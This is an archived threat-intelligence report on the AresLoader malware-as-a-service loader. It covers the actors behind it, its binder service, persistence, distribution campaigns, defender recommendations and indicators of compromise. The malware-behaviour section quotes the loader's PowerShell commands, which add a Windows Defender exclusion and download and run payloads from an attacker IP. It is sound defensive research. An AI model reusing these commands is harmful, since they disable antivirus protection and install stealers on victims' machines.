# 0-raw-data/ORKL/library/jsons_entries/755c9b08-535a-4fe4-8667-07155d7a699a.json
{
    "id": "755c9b08-535a-4fe4-8667-07155d7a699a",
    "created_at": "2023-05-06T02:08:27.638775Z",
    "updated_at": "2025-03-27T02:06:14.990015Z",
    "deleted_at": null,
    "sha1_hash": "9fa48a68c3e92b81af1cc512caae958c6a25bdbf",
    "title": "2023-03-22 - New loader on the bloc - AresLoader",
    "authors": "",
    "file_creation_date": "2023-05-05T01:55:38Z",
    "file_modification_date": "2023-05-05T01:55:38Z",
    "file_size": 271233,
    "plain_text": "# New loader on the bloc - AresLoader\n\n**intel471.com/blog/new-loader-on-the-bloc-aresloader**\n\nAresLoader is a new loader malware-as-a-service (MaaS) offered by threat actors with links\nto Russian hacktivism that was spotted recently in the wild. Most users are pushing a variety\nof information stealers with the service. The service offers a “binder” tool that allows users to\nmasquerade their malware as legitimate software.\n\n[We would like to acknowledge Roberto Martinez and](https://twitter.com/robemtnez) [Taisiia Garkava for alerting us to their](https://twitter.com/g_taisiia)\nin-the-wild observations of AresLoader and sharing their observations with us.\n\n## The actors behind the loader\n\nIn late November 2022, a threat actor using the handle AiD Lock aka DarkBLUP announced\na new MaaS program called AresLoader on Telegram. The actor subsequently announced\nthe service on the popular underground forums RAMP and XSS. The actor claimed the\nmalware loader was written in the C programming language and allegedly is undetectable by\nWindows Defender antivirus software.\n\n\n-----\n\nPreviously our cyber intelligence team had associated AiD Lock with PHANTOM DEV aka\n**Dead X Inject, and the DeadXInject Hack group, along with also offering the AiD Locker**\nransomware-as-a-service (RaaS) program.\n\nAres Loader image5\nFigure 1 - The AiD Locker Telegram channel July 28, 2022.\n\n## The hacktivism - cybercrime crossover continues\n\nThe group we associated AiD Lock with, PHANTOM DEV, engaged in hacktivist activities in\nmid-2022 and claimed affiliation with the Red Hackers Alliance Russia aka RHA, RHA R\npro-Russian hacktivist group. Evidence suggests multiple members of this group are either\nusers or administrators of the AresLoader MaaS. This trend is not surprising and something\nthat is being seen more frequently from hacktivist groups, who usually focus on distributed\ndenial-of-service (DDoS) attacks. However, the shift in tactics, techniques and procedures\n(TTPs) of these groups to align more closely with cybercriminals, while supporting nationstate political objectives, continues to be observed more frequently.\n\nAres Loader image4\nFigure 2 - Red Hackers Alliance Telegram channel April 15, 2022.\n\n## AresLoader - Malware-as-a-service breakdown\n\nThe AresLoader MaaS costs US $300 per month and includes five builds that allegedly are\n“packed manually.” The AresLoader panel offers an optional binder service in which a\nlegitimate file is merged with the malicious loader.\n\nAres Loader image7\nFigure 3 - The binder service upload page Dec. 27, 2022.\nThe idea is that the malicious payload can masquerade as a legitimate file, often an installer\nfor popular software.\n\nThe binder works by writing a stub launcher that will launch the original legitimate\nexecutable, then write a batch (.bat) file to disk and execute that .bat file with “cmd.exe.”\n\nAres Loader image6\nFigure 4 - The process tree of the binder payload, which depicts two\nexecution paths — legitimate and malicious — March 13, 2023.\nThe .bat file contains three PowerShell commands that perform three tasks:\n\n1. Add “C:\\” to the Windows Defender exclusion paths via:\n\nAdd-MpPreference -ExclusionPath ('C:\\\\')\n\n\n-----\n\n2. Fetch the malicious payload from a remote URL and execute it via:\n[WGet (http://5.75.248[.]207/emsabp32.dll) -OutfilE $EnV:AlLuSErSpRoFiLe\\\\emsabp32.dll;](http://5.75.0.248/)\n\nStARt-proCEss $EnV:aLluseRspROFiLE\\\\emsabp32.dll\n\nIn this case, a Raccoon Stealer payload with the\n24de09bb454b0318af20ffcc21c6dd4ad5d6627cab7d7bfcb5c2278f63a2c3b7 SHA-256.\n\n3. The third PowerShell command fetches and launches a .bat file that uses rundll32.exe to\nexecute the target payload — emsabp32.dll in this case.\n\nWget (http[:]//5.75.248[.]207/rundll32.bat) -oUtFIle $env:aLluSerSPROfIle\\\\rundll32.bat;\nsTArT-proCESS $EnV:aLluSErsPRoFILE\\\\rundll32.bat\n\n[.bat file - start rundll32.exe emsabp32.dll, [email protected]](https://intel471.com/cdn-cgi/l/email-protection)\n\n## Malware behavior\n\nAresLoader has basic download and execute capabilities. Upon execution, it checks if it is\nrunning as an administrator. If not, it attempts to escalate its privileges using the\nShellExecuteA application programming interface (API) and “runas” command.\n\nAres Loader image10\nFigure 5 - A privilege escalation attempt observed March 13, 2023.\nTo remain persistent, it sets a scheduled task and also adds a key to the\n“\\HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\” registry key.\n\nAres Loader image2\nFigure 6 - The image depicts the persistence mechanism —\nscheduled task observed March 13, 2023.\n\nAres Loader image1\nFigure 7 - The persistence mechanism — Run registry key observed\nMarch 13, 2023.\n\n## Distribution methods\n\n### Campaign one — SystemBC, Amadey direct install\n\n\n-----\n\nIntel 471 first observed AresLoader in the wild Jan. 26, 2023. It was dropped by SystemBC\n(C2: 89.22.225[.]242) and later by the Amadey version 3.50 controller (C2:\n85.209.135[.]109), both times fetched from the same drop location — the\nhttp[:]//5.75.248[.]207/loader.exe link.\n\nAres Loader image9\nFigure 8 - The download and execute commands received by Intel\n471 tracking systems captured March 13, 2023.\nIn addition to the AresLoader sample, the Laplas clipper was installed from the same IP\naddress that day. The threat actors first tried to install this payload directly following the\ninfection chain:\n\nSystemBC download and execute command a follow-up payload from the URL:\n\nhttp[:]//5.75.248[.]207/avicapn32.exe\n\nLaplas clipper (Golang variant) downloaded sample SHA-256 from the URL above:\n\n7cffcc27c8ab249e6e669274dd40d5ad138daa7f71548a5dfbb4b112db1053e2\n\nThey then shipped a second payload — a lightly obfuscated PowerShell script to download\nand fetch the above Laplas sample — from the URL\nhttp[:]//5.75.248[.]207/cmpbksrvc32.cmd.\n\nThe threat actor made a feeble attempt to bypass security measures by installing the same\npayload via a different method.\n\nWe tracked this AresLoader customer by monitoring the behavior of the SystemBC and\nAmadey botnets they control. We observed the actor operating the loader in this instance\nlikes to drop information-stealer malware, primarily Laplas, on victim machines and\nsubsequently cryptocurrency miner payloads.\n\n### Campaign two — Using AresLoader binder service\n\n\n-----\n\nA similar campaign to push AresLoader was discovered by malware researchers Roberto\nMartinez and Taisiia Garkava. In this case, several Raccoon Stealer samples were found\ndropping AresLoader. This AresLoader sample\n(40003d01db9c34da73a415792dba3a617fab65e91d2aae7bbbcd335af198a66b) dropped\nStealC and SystemBC payloads. The Raccoon Stealer payload was masquerading as an\ninstaller for a legitimate application called Revo Uninstaller Pro. The threat actor likely used\nthe binder service available through the AresLoader control panel.\n\nAres Loader image8\nFigure 9 - The legitimate software installer window that is launched in\ntandem with the malicious payload.\nThe aforementioned .bat file that calls the payload with rundll32.exe sheds additional light on\nthe use of the AresLoader binder feature. The VirusTotal intelligence platform shows parent\npayloads of the .bat file that all masquerade as common freeware.\n\nAres Loader image3\nFigure 10 - Some malicious files found on VirusTotal that probably\nwere created using the AresLoader binder service.\n\n## Payloads\n\nNot many instances of AresLoader have been discovered in the wild at present, but the\nloader MaaS does appear to have a few “customers.” Payloads Intel 471 and other\nresearchers have observed thus far include:\n\nSystemBC – A back door and socket secure internet protocol (SOCKS) proxy tunnel.\n\nLumma Stealer – A popular stealer MaaS.\n\nStealC – A new stealer MaaS that offers a configurable targeting system.\n\nAurora Stealer – A stealer MaaS written in the Golang programming language.\n\nLaplas clipper – A cryptocurrency clipper written in .NET and Golang.\n\n## Hosting\n\nThe AresLoader command and control (C2) infrastructure has been hosted at virtual private\nserver (VPS) providers in Germany, the Netherlands and Russia.\n\n\n-----\n\n**IP address** **Country** **ASN**\n\n162.55.187[.]234 DE AS24940 Hetzner Online GmbH\n\n193.168.49[.]8 RU AS198610 Beget LLC\n\n37.220.87[.]62 NL AS204603 Partner LLC\n\n5.161.88[.]63 US AS213230 Hetzner Online GmbH\n\n5.75.240[.]155 DE AS24940 Hetzner Online GmbH\n\n62.217.180[.]55 RU AS198610 Beget LLC\n\n62.217.180[.]92 RU AS198610 Beget LLC\n\n62.217.181[.]4 RU AS198610 Beget LLC\n\n## Intel 471 recommendations\n\nWe recommend defenders evaluate the following suggested measures for implementation in\ntheir environments:\n\nFlag scheduled tasks added via .bat or .cmd files.\n\nTurn on PowerShell logging.\n\nFlag changes to Defender exception list via “Add-MpPreference -ExclusionPath.”\n\nEnforce evaluation of code signing for .exe files and MSI installers to detect tampering.\n\n## MITRE ATT&CK® techniques\n\nThis report uses the MITRE ATT&CK® aka Adversarial Tactics, Techniques and Common\nKnowledge framework.\n\n\n-----\n\n**Technique Title** **ID** **Use**\n\n**[Execution [TA0002]](https://attack.mitre.org/tactics/TA0002/)**\n\n\nCommand and scripting\ninterpreter: PowerShell\n\nUser execution: Malicious\nfile\n\n**[Persistence [TA0003]](https://attack.mitre.org/tactics/TA0003/)**\n\n\nT1059.001 AresLoader uses a series of PowerShell scripts\nto load whichever malware it is loading for that\ncampaign.\n\nT1204.002 AresLoader depends on victims executing the\ndownloaded executable.\n\n\nScheduled Task/Job T1053.005 AresLoader uses a Scheduled Task to gain\npersistence.\n\n**Privilege Escalation**\n\n**[[TA0004]](https://attack.mitre.org/tactics/TA0004/)**\n\n\nAbuse elevation control\nmechanism: Elevated\nexecution with prompt\n\n**Defense Evasion**\n\n**[[TA0005]](https://attack.mitre.org/tactics/TA0005/)**\n\nImpair defenses: Disable or\nmodify tools\n\nMasquerading: Match\nlegitimate name or location\n\n**Command and Control**\n\n**[[TA0011]](https://attack.mitre.org/tactics/TA0011/)**\n\nApplication layer protocol:\nweb protocols\n\n\nT1548.004 AresLoader attempts to elevate privileges by\nexecuting itself with administrator privileges via\nShellExecuteA and “runas.”\n\nT1562.001 AresLoader modifies Windows Defender by\nsetting an exclusion.\n\nT1036.005 AresLoader masquerades as a legitimate\ninstaller for multiple software utilities by using a\nbinder to execute PowerShell commands.\n\nT1071.001 AresLoader uses HTTP/HTTPS to\ncommunicate with its C2.\n\n\n-----\n\n**Resource Development**\n\n**[[TA0042]](https://attack.mitre.org/tactics/TA0042/)**\n\nDedicated VPS\nInfrastructure\n\n## Indicators\n\n\nT1584.003 AresLoader MaaS operators rent VPSs to host\nthe AresLoader control panel and malicious\npayloads.\n\n\n**Indicator value** **Indicator**\n**description**\n\nhttp[:]//193[.]168[.]49[.]8 AresLoader\ncontroller\nURL\n\nhttp[:]//62[.]217[.]181[.]4 AresLoader\ncontroller\nURL\n\nhttp[:]//162[.]55[.]187[.]234 AresLoader\ncontroller\nURL\n\nhttp[:]//37[.]220[.]87[.]62 AresLoader\ncontroller\nURL\n\nhttp[:]//45[.]80[.]69[.]193 AresLoader\ncontroller\nURL\n\nhttp[:]//5[.]161[.]88[.]63 AresLoader\ncontroller\nURL\n\nhttp[:]//5[.]75[.]240[.]155 AresLoader\ncontroller\nURL\n\n\n-----\n\nhttp[:]//62[.]217[.]180[.]55 AresLoader\ncontroller\nURL\n\nhttp[:]//62[.]217[.]180[.]92 AresLoader\ncontroller\nURL\n\n169c70fc77814578aa83b3a666eb674c49e60ac6964b040de9b1e51c5966bf56 AresLoader\nsample\n\n40003d01db9c34da73a415792dba3a617fab65e91d2aae7bbbcd335af198a66b AresLoader\nsample\n\n5c5829697e65e815e41670a142a90251297f8cff94282837c09443b9c1ebad26 AresLoader\nsample\n\n7572b5b6b1f0ea8e857de568898cf97139c4e5237b835c61fea7d91a6f1155fb AresLoader\nsample\n\n7f53135e532f1799d5c77727e47bf8f25a0c1381e9684c9c9fb2d2d0cd0ab2e4 AresLoader\nsample\n\n812d4d9446b7962344e389b9498d08dabce1c9113bb18f554633da7e5992c4a3 AresLoader\nsample\n\n839cef8414117e4181cb87b998e90fb3dad81463f8c219966cb59147e2d7c2cb AresLoader\nsample\n\nb280e418cc13c8f1efe66c8c5f4b83e0a544ddbb9d0c460e24d279b93a22c5b3 AresLoader\nsample\n\nbcec1f5dcdc03772d33bc63922603129c6eaf56358a7b5f4a4583c65766d71da AresLoader\nsample\n\nf46b9aeafe296ebbad909e927fad26a21b05fbbc68cb446299c224fd27ea7fb0 AresLoader\nsample\n\n\n-----\n\nhttp[:]//89[.]22[.]225[.]242[:]4193 SystemBC\ncontroller\naddress\n\nhttp[:]//85[.]209[.]135[.]109/jg94cVd30f/index.php Amadey\ncontroller\nURL\n\nhttp[:]//5[.]75[.]248.207/loader[.]exe AresLoader\ndownload\nURL\n\nhttp[:]//5[.]75[.]248[.]207/avicapn32[.]exe Laplas\ndownload\nURL\n\nhttp[:]//5[.]75[.]248[.]207/cmpbksrvc32[.]cmd PowerShell\ndownload\nURL\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-22 - New loader on the bloc - AresLoader.pdf"
    ],
    "report_names": [
        "2023-03-22 - New loader on the bloc - AresLoader.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1683338907,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1683251738,
    "ts_modification_date": 1683251738,
    "files": {
        "pdf": "https://archive.orkl.eu/9fa48a68c3e92b81af1cc512caae958c6a25bdbf.pdf",
        "text": "https://archive.orkl.eu/9fa48a68c3e92b81af1cc512caae958c6a25bdbf.txt",
        "img": "https://archive.orkl.eu/9fa48a68c3e92b81af1cc512caae958c6a25bdbf.jpg"
    }
}